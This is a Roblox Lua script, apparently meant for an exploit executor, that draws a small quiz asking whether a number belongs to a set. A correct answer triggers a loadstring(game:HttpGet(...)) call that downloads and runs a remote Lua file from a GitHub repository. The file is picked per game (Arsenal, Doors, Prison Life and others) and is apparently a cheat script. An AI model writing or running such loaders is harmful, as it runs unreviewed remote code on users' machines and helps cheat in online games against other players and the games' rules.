local Concat
local Main = Instance.new("Frame", Instance.new("ScreenGui", game:GetService("CoreGui")))
local List = Instance.new("UIListLayout", Main)
local Elem = Instance.new("TextLabel", Main)
local Box = Instance.new("TextBox", Main)
local Set = Instance.new("TextLabel", Main)

Main.AnchorPoint = Vector2.new(0.5, 0.5)
Main.Position = UDim2.new(0.5, 0, 0.5, 0)
Main.Size = UDim2.new(0.4, 0, 0.2, 0)

List.FillDirection = Enum.FillDirection.Horizontal
List.SortOrder = Enum.SortOrder.Name

Elem.Name = "A"
Elem.Size = UDim2.new(0.25, 0, 1, 0)
Elem.TextSize = 20

Box.Name = "B"
Box.Size = UDim2.new(0.25, 0, 1, 0)
Box.PlaceholderText = "'∈', '∉'"
Box.Text = ""
Box.TextSize = 20

Set.Name = "C"
Set.Size = UDim2.new(0.5, 0, 1, 0)
Set.TextSize = 20

local function Create()
    Concat = {}
    while #Concat < 4 do
        local Rand = tostring(math.random(-5, 5))
        if not table.find(Concat, Rand) then
            table.insert(Concat, Rand)
        end
    end
    Elem.Text = math.random(-5, 5)
    Set.Text = "{"..table.concat(Concat, ", ").."}"
    return Main.Parent
end

Box.FocusLost:Connect(function()
    if ({
        ["∈"] = false,
        ["∉"] = true
    })[Box.Text] == not table.find(Concat, Elem.Text) then
        Main:Destroy()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/rbxluau/Roblox/main/"..(({
            [2820580801] = "Ohio",
            [111958650] = "Arsenal",
            [2440500124] = "Doors",
            [3476371299] = "RaceClicker",
            [3085257211] = "RainbowFriends",
            [73885730] = "PrisonLife"
        })[game.GameId] or "Universal")..".lua"))()
    else
        Create()
    end
end)

while Create() do
    task.wait(10)
end
